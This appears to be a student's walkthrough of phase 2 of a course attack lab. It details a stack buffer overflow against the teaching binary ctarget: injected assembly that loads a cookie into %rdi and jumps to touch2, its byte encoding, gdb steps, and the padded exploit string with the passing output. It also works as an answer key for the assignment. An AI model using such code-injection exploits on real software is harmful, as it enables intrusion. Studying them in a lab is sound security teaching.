Phase 2 involves injecting a little code and calling function touch2 while making it look like you passed the cookie as an argument to touch2

If you look inside the rtarget and search for touch2, it looks something like this:

```
000000000040178c <touch2>:
  40178c:	48 83 ec 08          	sub    $0x8,%rsp
  401790:	89 fe                	mov    %edi,%esi
  401792:	c7 05 e0 30 20 00 02 	movl   $0x2,0x2030e0(%rip)        # 60487c <vlevel>
  401799:	00 00 00 
  40179c:	3b 3d e2 30 20 00    	cmp    0x2030e2(%rip),%edi        # 604884 <cookie>
  4017a2:	75 1b                	jne    4017bf <touch2+0x33>
  4017a4:	bf a0 30 40 00       	mov    $0x4030a0,%edi
  4017a9:	b8 00 00 00 00       	mov    $0x0,%eax
  4017ae:	e8 8d f4 ff ff       	callq  400c40 <printf@plt>
  4017b3:	bf 02 00 00 00       	mov    $0x2,%edi
  4017b8:	e8 dc 04 00 00       	callq  401c99 <validate>
  4017bd:	eb 19                	jmp    4017d8 <touch2+0x4c>
  4017bf:	bf c8 30 40 00       	mov    $0x4030c8,%edi
  4017c4:	b8 00 00 00 00       	mov    $0x0,%eax
  4017c9:	e8 72 f4 ff ff       	callq  400c40 <printf@plt>
  4017ce:	bf 02 00 00 00       	mov    $0x2,%edi
  4017d3:	e8 73 05 00 00       	callq  401d4b <fail>
  4017d8:	bf 00 00 00 00       	mov    $0x0,%edi
  4017dd:	e8 ce f5 ff ff       	callq  400db0 <exit@plt>
```

If you read the instruction pdf, it says, "Recall that the first argument to a function is passed in register %rdi." 

So our goal is to modify the %rdi register and store our cookie in there.

So you have to write some assembly code for that task, create a file called phase2.s and write the below code, replacing the cookie and return address with yours

```
  movq $0x434b4b70,%rdi /* move your cookie to register %rdi */
  pushq $0x0040178c     /* push the address of touch2 to the stack */
  retq                  /* return */
```

Now you need the byte representation of the code you wrote above. compile it with gcc then dissasemble it

```
gcc -c phase2.s
objdump -d phase2.o  > phase2.d 
```

Now open the file phase2.d and you will get something like below

```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 70 4b 4b 43 	mov    $0x434b4b70,%rdi
   7:	68 8c 17 40 00       	pushq  $0x40178c
   c:	c3                   	retq   
```

The byte representation of the assembly code is `48 c7 c7 70 4b 4b 43 68 8c 17 40 00 c3`

Now you need to find the address of the %rsp register and pass it as the return address since it will execute our injected code

run ctarget through gdb 

`gdb ctarget`

set a breakpoint at getbuf 

`b getbuf`

print all the registers 

`info r`

That will prnt the addresses for all registers, grab the one for rsp

Now, create a text file named phase2.txt which will look something like below
```
48 c7 c7 70 4b 4b 43 68
8c 17 40 00 c3 00 00 00 /* first 13 bytes of the 24 bytes are the injected code, the rest is just padding */
00 00 00 00 00 00 00 00
28 38 62 55 00 00 00 00 /* address of register %rsp */
```

Run it through hex2raw

`./hex2raw < phase2.txt > raw-phase2.txt`

Finally, you run the raw file

`./ctarget < raw-phase2.txt`

Response looks like below

```
Cookie: 0x434b4b70
Type string:Touch2!: You called touch2(0x434b4b70)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
